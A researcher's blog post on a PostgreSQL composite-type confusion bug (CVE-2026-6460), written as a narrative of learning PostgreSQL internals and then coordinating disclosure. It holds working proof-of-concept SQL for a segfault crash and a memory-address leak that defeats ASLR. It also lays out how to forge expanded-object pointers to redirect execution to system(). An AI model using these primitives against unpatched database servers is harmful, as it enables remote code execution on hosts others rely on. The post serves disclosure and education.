---
title: 22-Year-Old PostgreSQL Bug Turned into Remote Code Execution
link: https://mehmetince.net/part-3-6-how-i-ended-up-turning-a-22-year-old-postgresql-type-confusion-primitive-into-rce-cve-2026-6460/
source: hnrss-org
published: 2026-11-12T18:22:22Z
updated: 2026-11-12T18:22:22Z
first_seen: 2026-11-13T00:08:02.707796831Z
authors:
- ozirus
content: extracted
html: 2026-11-12-22-year-old-postgresql-bug-turned-into-remote-code-execution.html
remote_preview:
  url: https://mehmetince.net/wp-content/uploads/2026/11/postgresql-composite-type-confusion-primitive-rce-cve-2026-6460.png
---

If you had told me in April 2026 one question “Mehmet, can we use managed PostgreSQL for this project?” would send me into the deepest rabbit hole of my life, I would have laughed.

Months later, I finally found the bottom of that rabbit hole. It was a 22-year-old zero-day in PostgreSQL core.

In this blog post you will read a story of how I ended up uncovering a new class of type-confusion vulnerabilities in PostgreSQL.

This is the 3rd part of blog post series named “[Systemic Risks in the Managed PostgreSQL Industry](https://mehmetince.net/tag/postgresql/)”. For those who have missed the first two part, feel free to start from 1st and 2nd which will give you a complete context of this madness.

TLDR:

> I gave PostgreSQL a value inside a composite type, changed the type of one of its fields, and asked it to read the value back. That type confusion led to one of the most reliable memory-corruption exploit I have seen. But I did not start by looking for a PostgreSQL core vulnerability.
>
> I was exploiting pg\_clickhouse, and getting that exploit to work left me with a question about how PostgreSQL understands its own data. With an AI agent as my teacher, I worked through the internals one question at a time. Then a seemingly unrelated conversation gave me the idea that connected it all, and eventually I found myself staring at a primitive that had been there for for awhile.
>
> This is the full true story of how those pieces came together, I am sure you will enjoy this story.

## **Beginning of August 2026**

During June and July, I had been exploiting memory-corruption vulnerabilities across several PostgreSQL extensions. One of the extensions that I achieved code execution was `pg_clickhouse`. That case study has its own story, which I will share in the future.

What matters here is what that exploit forced me to learn. `pg_clickhouse` translates ClickHouse values into native PostgreSQL values. A ClickHouse Array is not a PostgreSQL array, right ? So the extension had to rebuild its elements as `Datum` values in the format that PostgreSQL expected. A mistake in that conversion was what eventually gave me a code execution.

This was my first time meeting with things like `Datum`, `OIDs` etc in the PostgreSQL universe. I learned only enough to finish the exploit, but one question remained in the back of my mind:

> How does PostgreSQL itself decide what a value is? And how does it process and represent it?

Somewhere around late July, I finally got my head out of the extensions and just followed that question into PostgreSQL core.

> Disclaimer: I reported pg\_clickhouse oob write + read chain to the vendor and they fixed it at Jun 23.

## PostgreSQL Types 101

I started learning with a very simple query. What happens when I run the simplest query SELECT 1337?

While I avoided all the black magic in Postgres internals, I kept this crash course on the basics of data types.

I start with this query.

```
SET debug_print_parse = on;
SELECT 1337;
```

The database scanner looks at the query, recognises SELECT as a keyword, and 1337 as an integer token. Then it creates a parse tree for the query. Next, PostgreSQL walks the tree and transforms it into a typed query tree.

```
{QUERY
   :commandType 1
   :targetList (
      {TARGETENTRY
         :expr
            {CONST
               :consttype 23 
               :consttypmod -1 
               :constlen 4 
               :constbyval true 
               :constisnull false 
               :location 7 
               :constvalue 4 [ 57 5 0 0 0 0 0 0 ]
            }
      }
   )
}
```

Parse tree looks like above. But I just wanted to better understand things like what is the `consttype 23` ? why `constvalue` has `[ 57 5 0 0 0 0 0 0 ]`  and where is my `1337` value ? At this point, I asked Opus 5 to prepare me a full deep-dive course on PostgreSQL types.  Spending a few days around there and talking with my agent, whom I named `pg_expert` taught me these:

```
consttype   = 23      → int4
constlen    = 4       → four-byte payload
constbyval  = true    → stored by value
constisnull = false   → this is not NULL
```

`constvalue 4 [ 57 5 0 0 0 0 0 0 ]` can be converted to hexadecimal, making the value easier to recognize:

```
57 decimal = 0x39 
5 decimal = 0x05
```

On my little-endian system, the bytes were stored least-significant first:

```
39 05 00 00  →  0x00000539  →  1337
```

So `1337` had not disappeared.  But why do we even have `8 bytes` \[ 57 5 0 0 0 0 0 0 \] instead of simply 4 bytes ?

That was because `constvalue` was not declared as an `int32`. It was declared as a `Datum`, which was `8 bytes` Our value `1337::int4` value stored at the lower four bytes of that generic carrier.

How can that same 8-byte `Datum` represent a `text`, an `array`, or custom types ?

## A Datum Does Not Know What It Is

Chatting with my pg\_expert agent taught me more. A Datum does NOT know what it represents.

The eight bytes carrying `1337` did not contain a hidden label saying “I am an integer.”. PostgreSQL knew its type only because of this `consttype = 23`.

That number is an OID (Object IDentifiers) pointing to a row in the `pg_type` system catalog

```
SELECT
    oid,
    typname,
    typlen,
    typbyval,
    typalign,
    typinput::regproc,
    typoutput::regproc
FROM pg_type
WHERE oid = 23;


 oid | typname | typlen | typbyval | typalign | typinput | typoutput
-----+---------+--------+----------+----------+----------+-----------
  23 | int4    |      4 | t        | i        | int4in   | int4out
```

That means the `pg_type` row shows what the value means and how PostgreSQL will use it. So far, it’s brilliant and easy to understand. But what about the `text` type ?

```
SELECT
    oid,
    typname,
    typlen,
    typbyval,
    typinput::regproc,
    typoutput::regproc
FROM pg_type
WHERE oid IN ('int4'::regtype, 'text'::regtype) // <== HERE FILTERIN THE INT4 and TEXT only
ORDER BY oid;


typname | typlen | typbyval | typinput | typoutput
---------+--------+----------+----------+-----------
 int4    |      4 | true     | int4in   | int4out
 text    |     -1 | false    | textin   | textout
```

For text, `typlen = -1` means that the representation have a variable length. And `typbyval = false` means that the Datum carried a pointer.

```
Datum ──> pointer ──> variable-length text representation
```

So the same `8-byte` value stores a memory address for the text. Datum can pass the value either by value itself or by reference to it. Nice, I love the elegant abstraction Datums provides!

### Unknown is a type!

So far everything makes sense, but I wanted to better understand the  `typinput` and `typoutput` columns too. These functions convert the value provided by the query into a native Datum or vice versa. So I ran this again.

```
SELECT 1337, pg_typeof(1337), pg_column_size(1337);

 ?column? | pg_typeof | pg_column_size
----------+-----------+----------------
     1337 | integer   |              4
```

But then I added quotation marks to see if PostgreSQL has dynamic type casting/recognition or something:

```
SELECT pg_typeof('1337');

 pg_typeof
-----------
 unknown
```

I was a bit confused at this moment. I initially thought unknown meant “PostgreSQL does not know the type.” So I went back to chatting with my pg\_expert agent, who is teaching me everything so far. I learned that `unknown` is an actual PostgreSQL type with `OID 705`, used for string literals whose final type hasn’t been decided yet!

Again, this makes super sense because PostgreSQL deliberately assigns untyped string literals this temporary type because the same text could eventually become many different things!

```
SELECT '1337'::int4;
```

For example, the query supplies the target type int4. PostgreSQL looked up the `typinput` function for `int4`and called `int4in()` and when its need to be printer it use `int4out()`

![PostgreSQL converts the unknown literal '1337' through int4in() into a Datum, then returns text through int4out().](https://mehmetince.net/wp-content/uploads/2026/11/postgresql-unknown-literal-int4-datum-conversion.svg)\
PostgreSQL converts the unknown literal ‘1337’ through int4in() into a Datum, then returns text through int4out().

## Critical Thinking: Wait a Minute! The Type Chooses the Code

Up until this point, typinput and typoutput looked like ordinary conversion mechanism to me. `pg_type` contained many different native functions for many different types.

While learning more about these functions, one detail stayed with me. An output function did not inspect a Datum and discover its type. It simply trusted all the values and flags around the Datum.

`int4out()` extracted an integer because PostgreSQL had already selected it as the output function for `int4`. A different output function could interpret the same generic carrier according to completely different rules.

I still remember that, at that very moment, I was actually thinking about the [TOCTOU Vulnerabilities](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use) class of the web apps I have been exploiting/fixing for years and years.

> “What if I could somehow change the type between the moment PostgreSQL constructed a value and the moment it used that value?”

If I can do this, we might be able to force PostgreSQL to process a Datum created for a completely different type as if it were the type the function expects. Having a type confusion in PostgreSQL can actually give me an opportunity to abuse all the other functions in PostgreSQL internals.

So I went back to learning more about what I can use to force PostgreSQL to natively call different types’ output functions for my int4 value. It turns out that the `LANGUAGE internal` feature can be used for that purpose.

## LANGUAGE internal:  Type Confusion I Could Create on Purpose

The LANGUAGE internal allows a superuser to create an SQL function pointing to native code already compiled into PostgreSQL. I created the following one.

```
CREATE FUNCTION pg_temp.confused_textout(integer)
RETURNS cstring
AS 'textout'
LANGUAGE internal
STRICT;
```

Then I gave it the same int4 value. and my local-backend crashed!

```
SELECT pg_temp.confused_textout(1337);

server closed the connection unexpectedly
This probably means the server terminated abnormally before or while processing the request.
```

I’m pretty sure the PostgreSQL experts reading this wouldn’t be surprised by this crash, but it surprised me a lot!

It sent me in a completely different direction. I built a working exploit using this type-confusion feature to exploit `LANGUAGE internal` against security extensions deployed by managed PostgreSQL providers. That research eventually became a part of the [Part 2](https://mehmetince.net/part-2-6-breaking-the-superuser-guardrails-attacking-security-hardening-extensions-systemic-risks-in-the-managed-postgresql-industry/) story.

For a while, I moved on and left this type-confusion question behind.

Roughly two weeks later, something completely unrelated brought me back to it.

## Detour: Tomatoes and SQL Injection

Let me take a small detour. This Postgres article series is all about telling you my story in the end, isnt it ?

I do not remember the exact date, but during one of our runs or walks, my partner Bilge (Staff Machine Learning Engineer at EDB) and I were discussing second-order SQL injection in the PostgreSQL AI extensions and the possibility of tricking AI features of these extensions to hallucinate and produce malicious SQL queries.

That conversation led to chatting about `prepared statements`.

I first learned about SQL injection around 2005, and God knows how many times I have exploited it since.

Twenty years later, most libraries and frameworks still rely heavily on string escaping to generate secure SQL queries, even though RDBMSs have a beautiful feature named prepared statements.

I studied them when I was a uni student, mostly to see what could still be exploited even if the target app uses prepared statements. Things like triggering excessive SQL cold parsing and stuff like that.

But more importantly, for years I taught SQL Injection to thousands of my trainees with this concept:

> “Knowledge is knowing a tomato is a fruit; wisdom is not putting it in a fruit salad.”
>
> – Miles Kington

In my version, the SQL query is the recipe and the values are the ingredients. Prepared statements let the database understand the recipe first, then receive the ingredients separately. So even a value like `' OR 1=1 --` may look evil, but it remains data and never gets the chance to rewrite the query.

I had always seen this separation as a security feature. But this time, I noticed something in the middle of the convo with Bilge. Databases can finish all the parsing first and wait for me to execute it. Before execution, I can run whatever query I want.

I can alter types before executing the query!

## Uncovering 22-Year-Old PostgreSQL Type-Confusion Primitive

So the idea is simple; I could prepare a query, change something, and execute it later. But change what? PostgreSQL is not gonna let me redefine what the built-in types `int4`, `text`, or `UUID` mean.

I was not thinking about composite types at this point. Honestly, I barely knew what they were. I asked Claude agent pg\_expert a much simpler question:

> Which PostgreSQL types can I create, use inside a prepared query, and then alter it before running execute ?

That question led me to composite types. In PostgreSQL, a composite type represents the structure of a row. It is essentially a custom, user-defined data type that acts as a container for multiple fields, each with its own name and data type. \[[1](https://www.postgresql.org/docs/current/rowtypes.html), [2](https://neon.com/postgresql/tutorial/composite-types)\]

```
CREATE TYPE pg_temp.poc AS (
    key uuid
);
```

It had its own type OID, but its attributes defined the current row layout. I can change the attribute a type from UUID to another type without replacing the composite type itself.

### The Crash

I created a one-field composite where the attribute started as UUID. Then I prepared a query, changed that attribute to bytea, and executed the prepared statement.

```
CREATE TYPE pg_temp.poc AS (key uuid);

PREPARE pc_crash AS
    SELECT '(01020000-0000-0000-0000-000000000000)'
           ::pg_temp.poc;

ALTER TYPE pg_temp.poc
    ALTER ATTRIBUTE key TYPE bytea CASCADE;

EXECUTE pc_crash;
```

And the result was a segfault!

```
client backend was terminated by signal 11: Segmentation fault
DETAIL: Failed process was running: EXECUTE pc_crash;
```

I knew I had found exactly the kind of type confusion I had been looking for!

I knew this was no longer a superuser-only LANGUAGE internal behaviour I had exploited before.

I knew that I could trigger this crash as a lowest-privileged login role on any PostgreSQL instance. Probably all the Postgres-compatible offerings too (more about this later)

Last but not least, I already knew that controlled `UUID` bytes reaching the wrong native consumer, `bytea` in my case, had serious exploitation potential. These two have the most reliable exploit primitive I have seen in the PostgreSQL exploits.

Before diving into the Hacking PostgreSQL internals, we need to learn a few things about PostgreSQL to better understand the rest of the article!

## Quick Course: What is BYTEA ?

`bytea` is PostgreSQL’s data type for storing arbitrary binary data. Internally, it uses a variable-length representation called `varlena`. PostgreSQL places a small header before the bytes to describe their size and storage format.

```
Basic concepts of bytea

+----------------------+------------------------+
| 4-byte header       | binary payload         |
+----------------------+------------------------+
```

The header tells PostgreSQL which representation it is looking at and how large the complete value is.

We do not need to understand every `varlena` representation. For the rest of this article, we only need to know two things

```
Inline representation             →   the leading bytes can control the claimed length
External expanded representation  →  the leading bytes can introduce an internal object pointer
```

For example, a normal inline example of the five ASCII characters `hello`. That 24 can be decoded as `0x24 >> 2` which is 9. So 4-byte header + 5-byte payload = 9 bytes!

```
+----------------------+------------------+
| 24 00 00 00        | 68 65 6c 6c 6f     |
| 4-byte header      |      "hello"       |
+----------------------+------------------+
```

The most important example, external representation, when header starts with `01` PostgreSQL believes the value is not stored inline at all. Instead, it treats the bytes as a reference to an expanded object somewhere in memory.

```
+------------------+---------------------+----------------------------------+
| 01               | 02                  | 88 77 66 55 44 33 22 11          |
| external marker  | expanded-object tag | ExpandedObjectHeader * pointer   |
+------------------+---------------------+----------------------------------+
```

So the following data after the header is just object reference pointer instead of the data itself.

## Crash and Root Cause Analysis

Lets get back to where we were.

The UUID I supplied contained exactly sixteen bytes, starting with `01` and `02`. While attribute a was still UUID, there was nothing special about `01 02` or the fourteen zero bytes following it. They were simply controlled UUID data.

`ALTER TYPE` changed the current definition of attribute `key` from `uuid` to `bytea`, but it did not convert or rewrite the binary value already stored by the prepared query. During `EXECUTE`, PostgreSQL still had exactly the same bytes.

When we EXECUTE the query, PostgreSQL need to return the value of our type pg\_temp.poc, in order to do that, it calls the composite output function, record\_out().

So `record_out()` looks at the  pg\_temp.poc’s attribute `key` and says ‘That is bytea’ and selects `byteaout()`

But the data  `byteaout()`  takes is our old UUID bytes that we can control. This is where the type confusion happens!

![Animated diagram showing the same 16 UUID bytes reinterpreted by PostgreSQL `byteaout()` as a BYTEA header and expanded-object pointer.](https://mehmetince.net/wp-content/uploads/2026/11/micro-uuid-to-bytea.svg)\
byteaout() interprets 01 02 as an external expanded-object header and the following eight zero bytes as a NULL object pointer.

**All of these means, we can literally create any `varlena` representation we want by fully controlling the headers and following 12 byte!**

PostgreSQL thinks it needs to reach the ExpandedObjectHeader but its address is 00000000 because thats what we have written inside the UUID, therefore local-backend crash.

Before `byteaout()` could print the value, it first needed to convert this external representation into something it can print. I learned that PostgreSQL calls this process `detoasting`.

When we run `EXECUTE pc_crash`, the call path is as follows. The relevant path looked like this

```
EXECUTE pc_crash
  ├─ record_out()             a: bytea
  ├─ byteaout()               fetch + detoast
  ├─ detoast_external_attr()  01 02 → expanded
  ├─ DatumGetEOHP()           eohptr = NULL
  ├─ EOH_get_flat_size(NULL)
  └─ NULL->eoh_methods        SIGSEGV
```

PostgreSQL then passed the `NULL` pointer to `EOH_get_flat_size()`. The important line inside that function was effectively:

```
return eohptr->eoh_methods->get_flat_size(eohptr);
```

`eohptr` is what we influence and we choose 00000000 in our POC, which is a NULL. Therefore PostgreSQL crashed while trying to read its `eoh_methods` pointer because it believed it had received a valid external expanded object and followed the normal code path to process it.

The exploitation idea: replacing NULL with our fake object that could make PostgreSQL follow to our own choosen methods!

### Hijacking control-flow via Fake ExpandedObjects contains Native Function Pointers

ExpandedObjectMethods contains two native function pointers

```
typedef struct ExpandedObjectMethods
{
    EOM_get_flat_size_method get_flat_size;
    EOM_flatten_into_method  flatten_into;
} ExpandedObjectMethods;
```

Normal code uses those methods like this to convert an expanded object into its flat representation whenever it’s needed.

```
EOH_get_flat_size(ExpandedObjectHeader *eohptr)
{
    return eohptr->eoh_methods->get_flat_size(eohptr);
}

EOH_flatten_into(ExpandedObjectHeader *eohptr,
                 void *result, Size allocated_size)
{
    eohptr->eoh_methods->flatten_into(eohptr, result, allocated_size);
}
```

This is not normally an attacker-controlled callback interface. These are trusted internal representations created by PostgreSQL. The output functions can assume the pointer, header, and methods table are not malicious.

These are indirect native function calls. PostgreSQL obtains the function addresses from the object’s methods table and then calls them. That is something we can actually use to change the control-flow path.

Before going further, I needed a simple model for the objects involved. I named the two fake objects according to what they represented

```
H = fake ExpandedObjectHeader
M = fake ExpandedObjectMethods table
```

So our plan is that the `UUID` pointed to `H`, `H` pointed to `M`, and `M` contained the native function addresses that we wanna cal.

![PostgreSQL execution tree showing trusted methods and a forged object that redirects execution to system(H).](https://mehmetince.net/wp-content/uploads/2026/11/08-postgresql-execution-tree.svg)\
A forged expanded object redirects PostgreSQL’s methods lookup, turning the normal detoasting path into a call to system(H).

## Calling system($payload)

The important detail is that PostgreSQL used `H` twice. Lets remember the actual C code

```
eohptr->eoh_methods->get_flat_size(eohptr)
  │          │              │          │
  │          │              │          └── argument = H
  │          │              └───────────── function = system@plt
  │          └──────────────────────────── methods table = M
  └─────────────────────────────────────── object = H
```

First, it treated `H` as an `ExpandedObjectHeader` and read the `eoh_methods` pointer at offset `+0x08`.

That pointer led to `M`, where we had placed the address of `system()`. PostgreSQL then called the selected method and passed the original object pointer, `H`, as its first argument.

In other words, H helped PostgreSQL find `system()`, and then the same H was handed to `system()` as its parameter.

![](https://mehmetince.net/wp-content/uploads/2026/11/18-h-used-twice-system-call.svg)

Fortunately, the first eight bytes of H came before the `eoh_methods` pointer. I could place the NULL-terminated command `id>x` in those bytes while keeping the address of `M` at offset `+0x08`.

## Leaking Memory Addresses and defeating the ASLR with the same primitive

As I have heavily talked about exploiting extensions vulnerabilities on managed-Postgres providers at [Part 1](https://mehmetince.net/part-1-6-systemic-risks-in-the-managed-postgresql-industry-extension-risks-are-real-exploiting-postgis-memory-corruption-bug-at-neondb-supabase-and-many-more/), we dont get to read `/proc/self/mem` due to hardening. Our exploitation plan is very clear but the challenge is we need to leak addresses of these objects.

I started to chatting with my `pg_expert` to find more about PostgreSQL operation that could return a pointer-valued data while SQL expected an ordinary integer. The moment I prompted the agent, it went to

> “Oh actually we have talk about this during pg\_clickhouse exploit back in July. Do you remember the ClickHouse Array is not a PostgreSQL Array ?”
>
> – my beloved teacher pg\_expert agent

It was a twist of fate. I had ended up exactly where the original idea had started.

`PostgreSQL Arrays` store their element type inside their binary representation. `unnest()` trusts that internal type when deciding how to extract each element.

Normally, everything agrees:

```
SELECT x
FROM unnest(ARRAY['hello']::text[]) AS item(x);
```

The `array` says its element is `text`, so `unnest()` returns a pointer-valued text Datum and SQL processes it as text.

But what if the array internally says `text`, while the surrounding SQL contract says `bigint` ?

Because `text` is passed by reference, `unnest()` returns a Datum containing the memory address of the text value! But the surrounding SQL expression expects a by-value `bigint`, so PostgreSQL prints those same pointer bits as an integer.

In other to say this, we can exploit exactly same type confusion vulnerability to alter the arrays’ text element type to bigint so that unnest() will return the memory address instead of the value! aka leaking memory address!

### Creating a PostgreSQL Array data structures with UUID

The smallest PostgreSQL Array needs 48 bytes. A single UUID gives a 16 controlled bytes. So we can simply combine 3 UUIDs next to each other to build exactly 48 byte fully controlled data structer!

![Animated PostgreSQL array Datum layout showing three 16-byte UUID fields forming a 48-byte forged array carrier.](https://mehmetince.net/wp-content/uploads/2026/11/postgresql-forged-array-48-byte-memory-layout-1.svg)\
Three UUID fields provide 48 controlled bytes: 24 for array metadata, 4 for the text header, 16 for the payload, and 4 filler bytes.

The animation above shows how three UUIDs become one 48-byte array carrier. I prepare those bytes while all three attributes are still UUIDs. From there, I exploit the same type confusion for only the first UUID `a` to `bigint[]`!

So `unnest()` extracts the element as `text` and returns its pointer, while SQL expects a `bigint` and exposes that pointer as a memory address. The final `+4` skips the text header and lands on my controlled payload.

```
CREATE TYPE pg_temp.address_carrier AS (
    a uuid,
    b uuid,
    c uuid
);

CREATE FUNCTION pg_temp.leak_address(
    r pg_temp.address_carrier
)
RETURNS bigint
LANGUAGE plpgsql
AS $$
DECLARE
    pointer bigint;
BEGIN
    SELECT x INTO pointer
    FROM unnest(r.a) AS item(x)
    LIMIT 1;

    RETURN pointer + 4;
END
$$;

PREPARE address_leak AS
SELECT to_hex(pg_temp.leak_address(
    '(c0000000-0100-0000-0000-000019000000,01000000-0100-0000-5000-000011223344,55667788-99aa-bbcc-ddee-ff0000000000)'::pg_temp.address_carrier
));

ALTER TYPE pg_temp.address_carrier
    ALTER ATTRIBUTE a TYPE bigint[] CASCADE;

EXECUTE address_leak;


    to_hex    
--------------
 55f2a589ae0c
(1 row)
```

A direct `text` to `bigint` confusion would only reinterpret the old text bytes as an integer. The array was important because it forced PostgreSQL to first produce a real pointer and then expose those same pointer bits as a `bigint`.

## POC Videos

[Stock PostgreSQL 18.6 native system call Remote Code Execution 0-day @mdisec CVE-2026-6460](https://www.youtube.com/watch?v=My5eJeLwCeY)

Full working exploit on PostgreSQL 18.6

## CVE-2026-6460 Umbrella Fix and Variant Analysis of 21 more cases

Once I have reached that point, I started thinking about different scenarios of where we can alter the attribute types before execution. All the other possible ways of keeping the old value alive.

I found the same underlying mistake around `RowExpr`, `JSON` conversion caches and different places.

I reported 21 cases in total.

9 November 2026 The PostgreSQL security commits landed as part of a much larger release containing 52 new CVE.

**6 of those 52 CVEs are directly connected to this article.**

- **CVE-2026-6460** is the main umbrella fix for type confusion. It introduces composite attribute versioning,
- **CVE-2026-120142** anonymous RECORD descriptors.
- **CVE-2026-120148** backend-local anonymous-RECORD typmod
- **CVE-2026-116329** statistics import could publish values under an obsolete type
- **CVE-2026-116306** prevents ExecEvalFieldStore\[De\]Form from using a mismatched
- **CVE-2026-120139** integer overflow in tuple-size calculation

## Coordinating this with managed-PostgreSQL Providers

The reason why I have fallen into that rabbit hole 5 months ago was because I needed to better understand the how managed-database industry works before making a decision because at the end of the day, we all can outsource the infrastructure but we can not outsource the risk.

> When the vulnerability belongs to PostgreSQL core, how does the industry coordinate to protect its own customers?

So I ported the my locally working exploit to almost every managed PostgreSQL platform I know and privately shared reproducible PoCs with their security teams.

I haven’t seen any vendor who is not affected by this vulnerability! including those who has Postgres compatible offering.

Databricks security team engineers validated all the exploits immediately. Thanks to [Aaron](https://www.linkedin.com/in/askobayashi/) and his team.

Google escalated the AlloyDB reports to its highest priority P0. I am genuinely grateful of all the support from Google Cloud VRP team since day one!

SupaBase team received the full details around mid August. Thanks to endless support from the [Etienne](https://www.linkedin.com/in/etiennestalmans/) since I first contacted him.

Ubicloud members reached out to me after my [part 1](https://www.ubicloud.com/) article published and then they introduced me with the ClickHouse team. Both parties are also read in somewhere at end of August.

AWS Aurora/RDS and Microsoft Azure PostgreSQL teams received the reports and working PoC at mid August.

But what I respected the most is that some vendors brought their most senior engineering members to start implementing their own mitigation. They did not want to leave customers exposed while waiting for the upstream release cycle.

So yeah my whole August was like that.

## Closing: Thank you PostgreSQL Communities and Core Security Team

I spent 20 years of my life around security communities around the globe. But I really need to say that the support, positive approach and the respect I have seen my time at PGCONF.eu this year was quite suprized me. Have no idea PostgreSQL community at europe has such a family kind vibe.

After my talk “Nobody Gets to Be Superuser (Until I Broke In)” at [PGCONF.eu](https://www.postgresql.eu/events/pgconfeu2026/schedule/session/8137-nobody-gets-to-be-superuser-until-i-broke-in/) last month Valencia, I have received amazing support from everyone, specially the respected members of the community who are effortlessly fixing these vulnerabilities whenever someone sends an email to the securit@ address.

I owe so much of where I am today to open source. I’ve spent my life learning by hacking things, understanding how they work, and making them more secure. Being able to contribute to PostgreSQL and its ecosystem in my own way means a lot to me. Seeing those contributions so warmly welcomed means even more.

My talk this year was not recorded upon my request, but I receive a lot of invitation from different countries for their local PostgreSQL meetups.

If you’d like to hear the whole story, I’ll be presenting the 90 minutes edition of it at the [Prague PostgreSQL Meetup](https://cloomba.com/e/prague-postgresql-meetup-8-2026-11-30) on Monday, 30 November.

Come join me. I PROMISE IT’LL BE WORTH IT!\
[https://cloomba.com/e/prague-postgresql-meetup-8-2026-11-30](https://cloomba.com/e/prague-postgresql-meetup-8-2026-11-30)

(*If you’ve made it this far, I’d love to hear your thoughts! Feel free to leave a comment or ask me anything.*)

## Appendix: Dating the Primitive and the Duplicate Fiesta

The mutable-row-type primitive dates to commit `077db40fa1f3`, introduced on May 5, 2004 with `ALTER TABLE ... ALTER COLUMN ... TYPE`.

The exploitation technique I used relies on commit `1dc5ebc9077a`, introduced on May 14, 2015, which added expanded-object pointers and their native method callbacks. Later than many other primitives I discovered during exploiting 20+ variants.

I am not claiming that CVE-2026-6460 is exclusively “my vulnerability.” PostgreSQL treated it as an umbrella issue covering a much wider family of composite-type problems. Its commit credits many researchers whose reports may have involved overlapping discoveries, separate variants, or completely different journeys into the same systemic weakness.

That is the reality of vulnerability research in the age of AI. This article only tells the story of how I reached it without any cyber enabled models back in August 2026.

PostgreSQL records the reporters exactly as follows:

Reported-by: Heikki Linnakangas \<heikki.linnakangas@iki.fi>\
Reported-by: Andres Freund \<andres@anarazel.de>\
Reported-by: Andrew Gierth \<andrew@tao11.riddles.org.uk>\
Reported-by: Alexander Lakhin \<exclusion@gmail.com>\
Reported-by: Francesco Verardi \<frevadiscor89@gmail.com>\
Reported-by: Hcamael \<baiyjrh@gmail.com>\
Reported-by: Tomer Fichman \<tomer@irregular.com>\
Reported-by: OpenAI Security Research Team\
Reported-by: Peter Geoghegan \<pg@bowt.ie>\
Reported-by: Mehmet Ince @mdisec \<mehmet@mehmetince.net>\
Reported-by: Bryan Green \<dbryan.green@gmail.com>\
Reported-by: Sumedh Pathak \<sumedhpathak@microsoft.com>\
Reported-by: Nicholas Carlini \<npc@anthropic.com>\
Reported-by: Sergey Shinderuk \<s.shinderuk@postgrespro.ru>\
Reported-by: Yuxiao Guo \<dllggyx@outlook.com>\
Reported-by: Nikhil Sontakke \<nikhil@planetscale.com>\
Reported-by: Stephan Lipp \<Stephan@Adalogics.com>\
Reported-by: Daniel Bakker \<daniel@jackds.nl>
